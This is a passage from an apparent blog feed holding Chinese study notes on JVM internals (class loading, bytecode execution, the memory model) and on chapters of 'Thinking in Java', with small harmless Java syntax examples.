href="#5操作数栈管理"></a> 5.操作数栈管理</h3><p>  出栈:pop、pop2(2元素)<br />  复制栈顶并压栈:dup、dup2<br />  交换栈顶俩元素:swap</p><h3 id="6控制转移"><a class="markdownIt-Anchor" href="#6控制转移"></a> 6.控制转移</h3><h3 id="7方法调用与返回"><a class="markdownIt-Anchor" href="#7方法调用与返回"></a> 7.方法调用与返回</h3><p>  调用方法:invokevirtual<br />  调用接口方法:invokeinterface<br />  调用特殊方法:invokespecial(初始化、私有方法、父类方法)<br />  调用静态方法:invokestatic<br />  调用在运行时动态解析出调用点限定符的方法:invokedynamic</p><h3 id="8异常处理athrow"><a class="markdownIt-Anchor" href="#8异常处理athrow"></a> 8.异常处理:athrow</h3><h3 id="9同步"><a class="markdownIt-Anchor" href="#9同步"></a> 9.同步</h3><p>JVM使用monitorenter和monitorexit来支持同步的加锁与释放。</p><h1 id="第七章-虚拟机类加载机制"><a class="markdownIt-Anchor" href="#第七章-虚拟机类加载机制"></a> 第七章  虚拟机类加载机制</h1><h2 id="一-类加载顺序"><a class="markdownIt-Anchor" href="#一-类加载顺序"></a> 一、类加载顺序</h2><h3 id="1生命周期"><a class="markdownIt-Anchor" href="#1生命周期"></a> 1.生命周期</h3><p>  加载-&gt;验证-&gt;准备-&gt;解析-&gt;初始化-&gt;使用-&gt;卸载</p><h3 id="2加载时机"><a class="markdownIt-Anchor" href="#2加载时机"></a> 2.加载时机</h3><p>  必须进行初始化的情形(加载，验证，准备自然需要在此之前开始):</p><ol><li>遇到new(实例化对象)，getstatic(读取静态字段)，putstatic(设置静态字段)或者invokestatic(调用静态方法)这4条字节码指令时，如果类没有初始化则必须初始化。</li><li>使用反射</li><li>初始化类时，其父类还未初始化</li><li>VM启动时执行的主类</li><li>使用JDK1.7动态语言支持时，如果一个java.lang.invoke.MethodHandler实例最后的解析结果是REF_getStatic,REF_putStatic,REF_invokeStatck方法家句柄，并且这个方法句柄对应的类没有初始化，则需要先触发其初始化</li></ol><p>  接口在初始化时，并不要求其父类接口全部完成初始化，只有在使用父接口时才初始化。</p><h3 id="3加载"><a class="markdownIt-Anchor" href="#3加载"></a> 3.加载</h3><p>  加载阶段的主要任务:</p><ol><li>通过一个类的全限定名获取此类的一个二进制字节流。</li><li>通过字节流所代表的静态存储结构转化为方法区的运行时数据结构。</li><li>在内存中生成一个代表该类的java.lang.class对象，作为方法区的这个类各种数据访问入口。</li></ol><p>  非数组类的家在阶段既可以由引导类加载器完成，也可以由自定义类加载器去完成(重写类加载器的loadClass)。</p><h3 id="4验证"><a class="markdownIt-Anchor" href="#4验证"></a> 4.验证</h3><p>  确保Class文件的字节流中包含的信息符合当前VM的要求，需要验证如下内容:</p><ol><li>文件格式验证</li><li>元数据验证(是否有父类，是否继承了final类，是否实现了要求的方法)</li><li>字节码验证</li><li>符号引用验证</li></ol><h3 id="5准备"><a class="markdownIt-Anchor" href="#5准备"></a> 5.准备</h3><p>  为类变量分配内存并设置初始值，内存分配仅包括类变量(被static修饰的变量)，初始值也只是赋0值，但被final修饰的变量会赋具体值。</p><h3 id="6解析"><a class="markdownIt-Anchor" href="#6解析"></a> 6.解析</h3><p>  将常量池中的符号引用转换为直接引用，主要完成如下解析:</p><ol><li>类或接口的解析</li><li>字段解析</li><li>类方法解析</li><li>接口方法解析</li></ol><h3 id="7初始化"><a class="markdownIt-Anchor" href="#7初始化"></a> 7.初始化</h3><p>  <code>&lt;clinit&gt;</code>由编译器自动收集类中所有类变量赋值动作和静态语句块合并产生。VM中第一个被执行的<code>&lt;clinit&gt;()</code>方法一定是<code>java.lang.object</code>。<br />  如果各线程同时初始化一个类，只有一个线程会执行<code>&lt;clinit&gt;()</code>方法，其他线程都会阻塞。</p><h2 id="二-类加载器"><a class="markdownIt-Anchor" href="#二-类加载器"></a> 二、类加载器</h2><h3 id="1类相等判断"><a class="markdownIt-Anchor" href="#1类相等判断"></a> 1.类相等判断</h3><p>  类由加载它的类加载器和这个类本身一同确立起在JVM中的唯一性，必须来源于同一个加载器的同样的类在相等。</p><h3 id="2双亲委派模型"><a class="markdownIt-Anchor" href="#2双亲委派模型"></a> 2.双亲委派模型</h3><p><img src="https://pic.lufer.cc/images/2021/03/15/eHXHw6.png" alt="" /></p><p>  启动类加载器：使用C++实现(HotSpot)，主要加载<code>Java_Home/lib</code>,无法手动引用，如需委派，需要在ClassLoader中返回null。<br />  扩展类加载器：主要加载<code>Java_Home/lib/ext</code>。<br />  应用程序加载器：系统类加载器，也是默认加载器。</p><p>  所有请求都会向上传递至启动类加载器，当无法完成加载请求时才会向下传递，再由子加载器进行加载。</p><h1 id="第八章-虚拟机字节码执行引擎"><a class="markdownIt-Anchor" href="#第八章-虚拟机字节码执行引擎"></a> 第八章  虚拟机字节码执行引擎</h1><h2 id="一-栈帧"><a class="markdownIt-Anchor" href="#一-栈帧"></a> 一、栈帧</h2><p>  栈帧是VM栈中的栈元素，是一种数据结构，存储了方法的局部变量表，操作数栈等信息，具体结构如下图所示。</p><p><img src="https://pic.lufer.cc/images/2021/03/15/eHxQWF.png" alt="" /></p><h3 id="1局部变量表"><a class="markdownIt-Anchor" href="#1局部变量表"></a> 1.局部变量表</h3><p>  用于存放方法内的局部变量，最小单位为slot，slot的具体大小是可变的。<br />  slot是可以复用的，这回影响GC的行为，一个变量可能已经无用了，但局部变量表中还保存着该变量的引用，这个变量就不会被回收。当手动设置为null并被其他新变量覆盖时才会GC。</p><h3 id="2操作数栈后入先出"><a class="markdownIt-Anchor" href="#2操作数栈后入先出"></a> 2.操作数栈(后入先出)</h3><p>  初始为空，在方法执行时由字节码指令入/出栈。</p><h3 id="3动态连接"><a class="markdownIt-Anchor" href="#3动态连接"></a> 3.动态连接</h3><p>  指向运行时常量池中该栈帧所属方法的引用。</p><h3 id="4方法返回地址"><a class="markdownIt-Anchor" href="#4方法返回地址"></a> 4.方法返回地址</h3><p>  保存方法被调用的位置。</p><h1 id="二-方法调用"><a class="markdownIt-Anchor" href="#二-方法调用"></a> 二、方法调用</h1><h3 id="1解析"><a class="markdownIt-Anchor" href="#1解析"></a> 1.解析</h3><p>  在解析阶段，会将一部分符号引用转换为直接引用。<br />  该部分替换的都是非虚方法，主要包括静态方法、私有方法、实例构造器、父类方法、Final方法。</p><h3 id="2分派"><a class="markdownIt-Anchor" href="#2分派"></a> 2.分派</h3><ol><li>静态分派：根据参数的静态类型来定位方法的执行版本(重载Overload)。</li><li>动态分派：根据实际动态类型来选择方法的执行版本(重写Override)。</li></ol><h1 id="第十二章-java内存模型与线程"><a class="markdownIt-Anchor" href="#第十二章-java内存模型与线程"></a> 第十二章  Java内存模型与线程</h1><h2 id="一-java内存模型"><a class="markdownIt-Anchor" href="#一-java内存模型"></a> 一、Java内存模型</h2><h3 id="1内存模型目标"><a class="markdownIt-Anchor" href="#1内存模型目标"></a> 1.内存模型目标</h3><p>  Java内存模型的主要目标是定义程序中各个变量(包括实例字段、静态字段、构成数组对象的元素，但不包括局部变量与方法参数，因为是线程私有不共享的)的访问规则，即在VM中将变量存储到内存和从内存中取出变量这样的底层细节。<br />  其意义是可以屏蔽掉各种硬件和OS的内存访问差异。</p><h3 id="2工作模式"><a class="markdownIt-Anchor" href="#2工作模式"></a> 2.工作模式</h3><p>  所有变量都存储在主内存中，每条线程都有自己的工作内存，工作内存中保存了主内存的拷贝。<br />  线程对变量的所有操作都必须在工作内存中进行。<br /><img src="https://pic.lufer.cc/images/2021/03/15/eb9T3T.png" alt="" /></p><h3 id="3交互操作"><a class="markdownIt-Anchor" href="#3交互操作"></a> 3.交互操作</h3><ol><li>lock:作用与主内存，把变量标记为一条线程独占的状态</li><li>unlock:作用与主内存，释放一个变量的锁定</li><li>read:从主内存中读取</li><li>load:写入工作内存(与read同时出现)</li><li>use:将工作内存变量传递给执行引擎</li><li>assign:从执行引擎取值赋给工作内存</li><li>store:从工作内存中读取</li><li>write:写入主内存(与store同时出现)</li></ol><h1 id="二-java与线程"><a class="markdownIt-Anchor" href="#二-java与线程"></a> 二、Java与线程</h1><h3 id="1线程实现方式"><a class="markdownIt-Anchor" href="#1线程实现方式"></a> 1.线程实现方式</h3><ol><li>内核线程实现(调用接口:轻量级线程)</li><li>用户线程实现</li><li>用户线程+轻量级线程混合实现</li></ol><h3 id="2线程安全的实现方式"><a class="markdownIt-Anchor" href="#2线程安全的实现方式"></a> 2.线程安全的实现方式</h3><ol><li>互斥同步(加锁)</li><li>非阻塞同步(基于冲突检测的乐观并发策略)</li><li>无同步(可重入代码/线程本地存储)</li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;第二章-java内存区域与内存溢出异常&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#第二章-java内存区域与内存溢出异常&quot;&gt;&lt;/a&gt; 第二章  Java内存区域与内存溢出异常&lt;/h1&gt;
&lt;h2 id=&quot;一-运行时数据区域&quot;&gt;&lt;a c</summary>
      
    
    
    
    <category term="Java" scheme="https://coder.lufer.cc/categories/Java/"/>
    
    
    <category term="Java" scheme="https://coder.lufer.cc/tags/Java/"/>
    
    <category term="JVM" scheme="https://coder.lufer.cc/tags/JVM/"/>
    
    <category term="读书笔记" scheme="https://coder.lufer.cc/tags/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>Java编程思想部分要点总结</title>
    <link href="https://coder.lufer.cc/Java/Java%E7%BC%96%E7%A8%8B%E6%80%9D%E6%83%B3%E9%83%A8%E5%88%86%E8%A6%81%E7%82%B9%E6%80%BB%E7%BB%93/"/>
    <id>https://coder.lufer.cc/Java/Java%E7%BC%96%E7%A8%8B%E6%80%9D%E6%83%B3%E9%83%A8%E5%88%86%E8%A6%81%E7%82%B9%E6%80%BB%E7%BB%93/</id>
    <published>2019-07-31T05:34:31.000Z</published>
    <updated>2021-12-17T03:59:35.254Z</updated>
    
    <content type="html"><![CDATA[<h1 id="第一章-对象导论"><a class="markdownIt-Anchor" href="#第一章-对象导论"></a> 第一章  对象导论</h1><h3 id="1面向对象语言的五个特性"><a class="markdownIt-Anchor" href="#1面向对象语言的五个特性"></a> 1.面向对象语言的五个特性</h3><ol><li>万物皆为对象</li><li>程序是对象的集合</li><li>每个对象都有由其他对象所构成的存储</li><li>每个对象都有其类型</li><li>某一特定类型的对象都可以接受同种类型的消息</li></ol><h3 id="2前期绑定与后期绑定"><a class="markdownIt-Anchor" href="#2前期绑定与后期绑定"></a> 2.前期绑定与后期绑定</h3><p>  前期绑定：编译器产生对一个具体函数名字的调用，运行时将这个调用解析到将要被执行的绝对地址。<br />  后期绑定：编译器确保被调用方法的存在，并对参数和返回值执行类型检查，被调用的代码直到运行时才确定。</p><h1 id="第二章-一切都是对象"><a class="markdownIt-Anchor" href="#第二章-一切都是对象"></a> 第二章  一切都是对象</h1><h3 id="1对象的内存存储"><a class="markdownIt-Anchor" href="#1对象的内存存储"></a> 1.对象的内存存储</h3><ol><li>寄存器</li><li>堆栈：存放对象引用</li><li>堆：存放所有Java对象</li><li>常量：常量值通常直接存放在程序代码内部</li><li>非RAM存储：例如流对象和持久化对象<br />(对于基本类型，存放在堆栈中)</li></ol><h3 id="2基本类型与包装类型"><a class="markdownIt-Anchor" href="#2基本类型与包装类型"></a> 2.基本类型与包装类型</h3><table><thead><tr><th>基本类型</th><th>大小</th><th>包装器类型</th></tr></thead><tbody><tr><td>boolean</td><td>-</td><td>Boolean</td></tr><tr><td>char</td><td>16bit</td><td>Character</td></tr><tr><td>byte</td><td>8bit</td><td>Byte</td></tr><tr><td>short</td><td>16bit</td><td>Short</td></tr><tr><td>int</td><td>32bit</td><td>Integer</td></tr><tr><td>long</td><td>64bit</td><td>Long</td></tr><tr><td>float</td><td>32bit</td><td>Float</td></tr><tr><td>double</td><td>64bit</td><td>Double</td></tr><tr><td>void</td><td>-</td><td>Void</td></tr></tbody></table><h3 id="3高精度计算类"><a class="markdownIt-Anchor" href="#3高精度计算类"></a> 3.高精度计算类</h3><ol><li>BigInteger：可表示任何大小整数</li><li>BigDecimal：可表示任何精度浮点数</li></ol><h3 id="4变量初始化"><a class="markdownIt-Anchor" href="#4变量初始化"></a> 4.变量初始化</h3><p>  没有初始化的数组会被指向null，引用null会抛异常。<br />  没有初始化的局部变量会导致编译错误。<br />  没有初始化的成员变量会被自动初始化。</p><h3 id="5static关键字"><a class="markdownIt-Anchor" href="#5static关键字"></a> 5.Static关键字</h3><p>  使用Static的两种原因：</p><ol><li>只想为特定域分配单一存储空间</li><li>希望某个方法不与包含它的类的任何对象关联在一起</li></ol><h1 id="第五章-初始化与清理"><a class="markdownIt-Anchor" href="#第五章-初始化与清理"></a> 第五章  初始化与清理</h1><h2 id="一-初始化"><a class="markdownIt-Anchor" href="#一-初始化"></a> 一、初始化</h2><h3 id="1构造器初始化顺序"><a class="markdownIt-Anchor" href="#1构造器初始化顺序"></a> 1.构造器初始化顺序</h3><p>  在类的内部，变量定义的先后顺序决定了初始化的顺序，但他们依旧会在任何方法被调用之前得到初始化。<br />  先初始化静态对象，然后才是非静态对象。<br />  如果类没有定义<code>toString</code>方法，<code>print</code>将会打印&quot;类名@对象地址&quot;</p><h2 id="二-垃圾清理"><a class="markdownIt-Anchor" href="#二-垃圾清理"></a> 二、垃圾清理</h2><h3 id="1gc技术原理"><a class="markdownIt-Anchor" href="#1gc技术原理"></a> 1.GC技术原理</h3><ol><li>引用计数<br />  每个对象都有一个计数器，当有引用连接至对象时，引用计数+1，当引用离开作用域或者被置为null时，引用计数-1。<br />  引用计数通常在数值为0时立即回收，但是如果对象间存在循环引用，则可能会出现“应该被回收，但计数不为0”的情况。<br />  (这种方法常用来说明GC的工作方式，但是没有JVM使用这种方式)</li><li>停止-复制<br />  暂停程序运行，将所有存活对象从当前堆复制到另一个堆，没有被复制的就全部是垃圾，当复制到新堆时，变量排列紧凑，所以可以直接分配新空间。<br />  “按需从堆中分配几块较大的内存，复制动作发生在内存之间“</li><li>标记-清扫<br />  从堆栈和静态区出发，遍历所有的引用，并对对象进行标记，在全部标记工作完成后，将没有标记的对象回收。<br />  同样也需要暂停程序。</li></ol><h1 id="第六章-访问权限控制"><a class="markdownIt-Anchor" href="#第六章-访问权限控制"></a> 第六章  访问权限控制</h1><h2 id="一-访问权限"><a class="markdownIt-Anchor" href="#一-访问权限"></a> 一、访问权限</h2><h3 id="1-包访问权限"><a class="markdownIt-Anchor" href="#1-包访问权限"></a> 1. 包访问权限</h3><p>  没有设置访问权限的默认为包访问权限，包访问权限中同一包内的所有类成员可互相访问，但对包外的类而言则是Private的。<br />  如果两个类处在同一目录下，并且没有设置任何包名称，Java会认为这些类处于该目录下的默认包中。</p><h3 id="2public"><a class="markdownIt-Anchor" href="#2public"></a> 2.Public</h3><p>  一个编译单元只能有一个Public类，并且类名需要与文件名完全一致。</p><h3 id="3private"><a class="markdownIt-Anchor" href="#3private"></a> 3.Private</h3><p>  用Private修饰构造器，在其他方法中return一个新对象，这样可以阻止对构造器的直接访问。</p><h3 id="4protected"><a class="markdownIt-Anchor" href="#4protected"></a> 4.Protected</h3><p>  被Protected修饰的成员可被派生类访问，同时还提供包访问权限。</p><h1 id="第七章-复用类继承"><a class="markdownIt-Anchor" href="#第七章-复用类继承"></a> 第七章  复用类（继承）</h1><h3 id="1-初始化"><a class="markdownIt-Anchor" href="#1-初始化"></a> 1. 初始化</h3><p>  总是先初始化基类，再初始化派生类，即使没有基类对象，也要初始化基类。<br />  基类构造器总是会被调用。<br />  如要调用带参的基类构造器，需要调用<code>super()</code></p><h3 id="2-override"><a class="markdownIt-Anchor" href="#2-override"></a> 2. @Override</h3><p>  该注解没有什么额外功能，只是说明该方法要进行Override，如果使用了该注解但没有进行Override，会触发编译错误。</p><h3 id="3组合与继承"><a class="markdownIt-Anchor" href="#3组合与继承"></a> 3.组合与继承</h3><ol><li>组合用于想在新类中使用现有类的功能。</li><li>继承用于使用某个现有类，并基于它开发一个特殊版本。</li></ol><h3 id="4final"><a class="markdownIt-Anchor" href="#4final"></a> 4.Final</h3><p>  用Final定义的基础变量类型无法被改变。<br />  用Final定义的对象无法改变其引用指向，但是可以修改它引用的对象的值。<br />  可以创建不赋值的空白Final，但是必须保证使用前被初始化。<br />  方法中被Final修饰的参数只能读不能写。<br />  用Final修饰的类无法更改，无法继承。<br />  Final的意义：把方法锁定，以防任何继承类修改。</p><h1 id="第八章-多态"><a class="markdownIt-Anchor" href="#第八章-多态"></a> 第八章  多态</h1><h3 id="1基类与派生类"><a class="markdownIt-Anchor" href="#1基类与派生类"></a> 1.基类与派生类</h3><ol><li>基类为其所有派生类建立公共接口，但其派生类向上转型由基类引用后，仍可找到其override的接口。<br />  但是只有非Private方法可以被覆盖，因为Private对派生类不可见，派生类中的方法相当于新方法。</li><li>派生类的构造器必然会调用基类的构造器，如果没有显式调用，则会自动调用基类默认构造器，如果没有默认构造器则会编译错误。<br />  如果需要手动清理对象，则必须在派生类中覆盖清理方法，并调用基类的清理方法，销毁顺序与初始化顺序相反。</li></ol><h3 id="2初始化过程"><a class="markdownIt-Anchor" href="#2初始化过程"></a> 2.初始化过程</h3><ol><li>先给各对象分配存储空间，并初始化为二进制的0。</li><li>调用基类构造器</li><li>初始化主体</li><li>调用派生类构造器</li></ol><h3 id="3协变返回类型"><a class="markdownIt-Anchor" href="#3协变返回类型"></a> 3.协变返回类型</h3><p>  在派生类中被覆盖的方法可以返回基类的返回类型的某种派生类型。</p><h1 id="第九章-接口"><a class="markdownIt-Anchor" href="#第九章-接口"></a> 第九章  接口</h1><h3 id="1abstract抽象类"><a class="markdownIt-Anchor" href="#1abstract抽象类"></a> 1.Abstract抽象类</h3><p>  如果一个类包含一个或多个抽象方法，则必须被限定为抽象类，但抽象类可以没有抽象方法。<br />  抽象类无法产生对象，继承自抽象类的类如果没有完全实现其抽象方法，则也必须用abstract修饰。</p><h3 id="2interface接口"><a class="markdownIt-Anchor" href="#2interface接口"></a> 2.Interface接口</h3><p>  用Interface修饰的接口完全由抽象方法组成，不提供任何实现。<br />  接口中的任何域都自动是static和final的。<br />  接口中的方法默认为Public，所以实现接口时也必须定义为Public。</p><h3 id="3多重继承"><a class="markdownIt-Anchor" href="#3多重继承"></a> 3.多重继承</h3><p>  Java是单继承，但是一个类可以继承自一个基类，同时实现多个接口。</p><h3 id="4接口扩展"><a class="markdownIt-Anchor" href="#4接口扩展"></a> 4.接口扩展</h3><p>  接口可以继承，通过继承可以在接口中添加新方法，从而扩展接口。</p><h1 id="第十章-内部类"><a class="markdownIt-Anchor" href="#第十章-内部类"></a> 第十章  内部类</h1><h3 id="1内部类"><a class="markdownIt-Anchor" href="#1内部类"></a> 1.内部类</h3><p>  在类的内部定义另一个类，内部类拥有其外围类的所有元素的访问权。</p><h3 id="2this与new"><a class="markdownIt-Anchor" href="#2this与new"></a> 2.this与new</h3><p>  用<code>OuterClass.this</code>可以获得一个外部类对象的引用。<br />  用<code>OuterClassObject.new</code>可以使其创建一个内部类对象。</p><h3 id="3匿名内部类"><a class="markdownIt-Anchor" href="#3匿名内部类"></a> 3.匿名内部类</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Contents <span class="title">contents</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> Contents()</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">int</span> i=<span class="number">1</span>;</span><br><span class="line">        ......</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4嵌套类"><a class="markdownIt-Anchor" href="#4嵌套类"></a> 4.嵌套类</h3><p>  将内部类用static修饰</p><ol><li>要创建嵌套类的对象，并不需要其外围类的对象。</li><li>不能从嵌套的对象中访问非静态的外围对象。</li></ol><p>  借助嵌套类，可以在接口中实现一些代码，甚至可以实现外围接口。</p><h1 id="第十一章-持有对象"><a class="markdownIt-Anchor" href="#第十一章-持有对象"></a> 第十一章  持有对象</h1><h2 id="一-容器类"><a class="markdownIt-Anchor" href="#一-容器类"></a> 一、容器类</h2><ol><li>Collection：<br />List/Set/Queue</li><li>Map</li></ol><h2 id="二-迭代器"><a class="markdownIt-Anchor" href="#二-迭代器"></a> 二、迭代器</h2><h3 id="1iterator"><a class="markdownIt-Anchor" href="#1iterator"></a> 1.Iterator</h3><p>  使用iterator()方法返回一个Iterator，包含<code>next()/hasNext()/remove()</code>方法。<br />  迭代器不关心容器的类型，只关心容器中的变量类型。</p><h3 id="2listiterator"><a class="markdownIt-Anchor" href="#2listiterator"></a> 2.ListIterator</h3><p>  只能用于List容器，但是可以双向移动。<br />  包含<code>next()/previous()/set()</code>等方法</p><h3 id="三-set"><a class="markdownIt-Anchor" href="#三-set"></a> 三、Set</h3><p>  Set就是Collection的一种实现，接口完全一样。</p><ol><li>HashSet使用散列结构</li><li>TreeSet使用红黑树</li><li>LinkedHashList使用散列，但看起来像是使用了链表。</li><li>TreeSet中保存的内容是有序的</li></ol><p>  用<code>contains()</code>可以判断Set是否包含元素。</p><h3 id="四-map"><a class="markdownIt-Anchor" href="#四-map"></a> 四、Map</h3><p>  将容器组合起来可以获得多为扩展，例如<code>Map&lt;Int,List&lt;&gt;&gt;</code>。</p><h3 id="五-queue"><a class="markdownIt-Anchor" href="#五-queue"></a> 五、Queue</h3><p>  PriorityQueue可以按优先级排序，通过构建Comparator来实现优先级比较。</p><h1 id="第十二章-异常处理"><a class="markdownIt-Anchor" href="#第十二章-异常处理"></a> 第十二章  异常处理</h1><p>  用Try包裹可能产生异常的语句块，用Catch进行捕获。<br />  仅搜索第一个匹配的Catch块，Catch执行后即认为异常得到处理，不会再匹配其他符合要求的Catch，即便再次抛出，也只会抛给上层处理，不会再被Catch捕获。</p><h3 id="1异常处理模型"><a class="markdownIt-Anchor" href="#1异常处理模型"></a> 1.异常处理模型</h3><ol><li>终止模型：抛出异常，终止代码。</li><li>恢复模型：异常被处理后继续执行。</li></ol><h3 id="2自定义异常"><a class="markdownIt-Anchor" href="#2自定义异常"></a> 2.自定义异常</h3><p>  可以通过继承自异常类来创建自定义类型的异常。</p><h3 id="3finally"><a class="markdownIt-Anchor" href="#3finally"></a> 3.Finally</h3><p>  由于Java不需要进行内存回收，也不需要析构，所以Finally中主要负责将除内存之外的其他资源恢复到初始状态。</p><h1 id="第十四章-类型信息"><a class="markdownIt-Anchor" href="#第十四章-类型信息"></a> 第十四章  类型信息</h1><h2 id="一-classloader"><a class="markdownIt-Anchor" href="#一-classloader"></a> 一、ClassLoader</h2><p>  Java的Class是动态加载的，各个部分在必需时才会被加载。<br />  先检查类是否加载，若尚未加载，默认的类加载器根据类名查找Class。<br />  在加载时会验证类有没有被破坏，并且是否包含不良代码。</p><p>  实际工作：</p><ol><li>加载<br />  由类加载器执行，查找字节码，并从字节码创建class对象。</li><li>链接<br />  验证字节码，为静态域分配空间，如果必须的话，解析这个类创建的对其他类的所有引用。</li><li>初始化<br />  如果类具有父类，则先对父类进行初始化，执行静态初始化器和静态块。</li></ol><h2 id="二-rtti"><a class="markdownIt-Anchor" href="#二-rtti"></a> 二、RTTI</h2><h3 id="1主要形式"><a class="markdownIt-Anchor" href="#1主要形式"></a> 1.主要形式</h3><ol><li>传统的类型转换/强制类型转换，由RTTI保证类型的正确性。</li><li>代表对象类型的class对象，通过查询class对象来获取运行时所需信息。</li><li>InstanceOf返回布尔值，判断对象类型。</li></ol><p>  用<code>InstanceOf</code>判断的是是否为该类或者其派生类，用类名<code>.class</code>搭配<code>==</code>或者<code>equals()</code>只能判断是否为该类。</p><h2 id="三-反射"><a class="markdownIt-Anchor" href="#三-反射"></a> 三、反射</h2><p>  检查可用的方法，并返回方法名。<br />  RTTI是在编译时打开和检查class文件，而反射是在运行时打开和检查class文件。</p><h1 id="第十五章-泛型"><a class="markdownIt-Anchor" href="#第十五章-泛型"></a> 第十五章  泛型</h1><h2 id="一-简单泛型"><a class="markdownIt-Anchor" href="#一-简单泛型"></a> 一、简单泛型</h2><p>  用<code>&lt;&gt;</code>括住类型参数跟在类名后，括号内可以为多元组。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class ClassName&lt;T&gt;() &#123;&#125;</span><br><span class="line">Class ClassName&lt;A,B,C&gt;() &#123;&#125;</span><br></pre></td></tr></table></figure><p>  不能使用基本类型作为参数，需要使用包装类型。<br />  如果使用泛型方法可以取代将整个类泛型化，那就应该只使用泛型方法。</p><h2 id="二-擦除"><a class="markdownIt-Anchor" href="#二-擦除"></a> 二、擦除</h2><p>  在泛型内部，无法获得任何有关泛型参数类型的信息，任何具体信息都将被消除，但是擦除只会擦除到第一个边界，</p><h3 id="1边界"><a class="markdownIt-Anchor" href="#1边界"></a> 1.边界</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;T extends ClassA&amp;ClassB&gt; </span><br></pre></td></tr></table></figure><h3 id="2通配符"><a class="markdownIt-Anchor" href="#2通配符"></a> 2.通配符</h3><p>  <code>List&lt;? extends BaseClass&gt;</code><br />  超类型通配符：<code>List&lt;? super SuperClass&gt;</code><br />  无界通配符：<code>List&lt;?&gt;</code></p><h2 id="三-问题"><a class="markdownIt-Anchor" href="#三-问题"></a> 三、问题</h2><ol><li>基本类型不能用作类型参数，要使用包装器。</li><li>一个类不能实现同一泛型接口的两种变体，因为会被擦除。</li><li>使用带有泛型类型参数的转型或InstanceOf不会有任何结果。</li><li>由于擦除，不能产生唯一的参数列表，所以不能重载。</li><li>基类会劫持接口，使得实现接口后就不能再接受其他类。</li></ol><h1 id="第十七章-容器深入研究"><a class="markdownIt-Anchor" href="#第十七章-容器深入研究"></a> 第十七章  容器深入研究</h1><p><img src="https://pic.lufer.cc/images/2021/03/15/eTh5zF.gif" alt="" /></p><h2 id="一-set"><a class="markdownIt-Anchor" href="#一-set"></a> 一、SET</h2><p>  如果没有其他限制，则应该使用HashSet，因为HashSet在速度上进行了优化。<br />  必须为类创建equals方法，在使用HashSet或LinkedHashSet时还要实现hasCode方法。<br />  SortedSet：按比较函数排序的Set<br />  LinkedHashSet：按插入顺序排序的Set</p><h2 id="二-queue"><a class="markdownIt-Anchor" href="#二-queue"></a> 二、Queue</h2><p>  两种实现(LinkedList/PriorityQueue)的差异在于排序行为而不在于性能。<br />  LinkedList包含支持双向队列的方法，但是没有显式的接口。</p><h2 id="三-map"><a class="markdownIt-Anchor" href="#三-map"></a> 三、Map</h2><ol><li>HashMap</li><li>LinkedHashMap：按插入顺序排序</li><li>TreeMap：基于红黑树，有序排列，比HashMap慢</li><li>WeakHashMap：当没有引用指向某个Key时，该Key可以被回收</li><li>ConcurrentHashMap：线程安全的Map，但是没有同步锁</li><li>IdentityHashMap：内部用==代替了equals，所以具有完全不同的性能</li></ol><h2 id="四-散列码"><a class="markdownIt-Anchor" href="#四-散列码"></a> 四、散列码</h2><p>  步骤：</p><ol><li>对对象进行散列，得到一个值</li><li>将该值作为数组下标</li><li>在该下表下的数组元素存在值得List</li><li>查找时根据下标找到List，再在List中进行线性查找</li></ol><p>  散列码的生成必须要块，而且有意义，必须基于对象内容生成，保证对于同样的内容生成的散列码相同，但是不需要独一无二，不同内容也可生成相同的散列码，好的散列函数应该生成相对较为分散的散列码。</p><h2 id="五-性能比较"><a class="markdownIt-Anchor" href="#五-性能比较"></a> 五、性能比较</h2><h3 id="1list"><a class="markdownIt-Anchor" href="#1list"></a> 1.List</h3><p>  ArrayList在数据量大的时候访问比较快，但是插入新数据会比较慢。<br />  LinkedList插入删除较快。</p><h3 id="2map"><a class="markdownIt-Anchor" href="#2map"></a> 2.Map</h3><p>  HashMap与HashTable速度相当，都比较快。<br />  LinkedHashMap会慢一点，因为在插入时还要维护顺序。</p><h2 id="六-持有引用"><a class="markdownIt-Anchor" href="#六-持有引用"></a> 六、持有引用</h2><p>  用Reference对象可以使我们持有该对象，但是在需要GC时回收该对象，在存在可能会耗尽内存的大对象时特别有用。</p><h1 id="第十八章-java-io"><a class="markdownIt-Anchor" href="#第十八章-java-io"></a> 第十八章  Java I/O</h1><h3 id="1文件加锁"><a class="markdownIt-Anchor" href="#1文件加锁"></a> 1.文件加锁</h3><p>  对FileChannel调用trylock或lock可以对文件加锁。<br />  文件锁对其他进程是可见的，因为Java的文件锁直接映射在系统加锁工具上。</p><ol><li>TryLock：非阻塞式加锁，若不能加锁则返回。</li><li>Lock：阻塞式加锁，会阻塞进程直至锁可以获得，或者调用Lock的线程中断/通道关闭。</li></ol><p>  <code>Filelock.release()</code>可以释放锁。<br />  trylock或lock可以带参数来指定加锁范围，只会锁定固定区域，不带参的锁将根据文件尺寸变化而变化。</p><h3 id="2锁的类型"><a class="markdownIt-Anchor" href="#2锁的类型"></a> 2.锁的类型</h3><ol><li>独占锁：锁定的资源只允许加锁的程序使用。</li><li>共享锁：锁定的资源可被其他程序读取，但不能更改。</li></ol><p>  锁的类型由操作系统底层提供，如果不支持共享锁，调用时会返回独占锁。<br />  锁的类型可以通过<code>Filelock.isShared()</code>查询。</p><h3 id="3对象序列化"><a class="markdownIt-Anchor" href="#3对象序列化"></a> 3.对象序列化</h3><p>  对于实现了Seriallized接口的对象，可以使用writeObject将其序列化，序列化可以将对象的关系网全部保存，可以借助readObject读取。</p><p>序列化的意义：</p><ol><li>支持远程方法调用(RMI),可以在本机上使用远程计算机上的对象。</li><li>支持JavaBeans。</li></ol><h3 id="4控制序列化"><a class="markdownIt-Anchor" href="#4控制序列化"></a> 4.控制序列化</h3><p>  让类实现接口Externalizable，并实现writeExternal和readExternal方法，但该类的默认构造器需为public，因为所有的默认构造器都会被调用。</p><h3 id="5transient"><a class="markdownIt-Anchor" href="#5transient"></a> 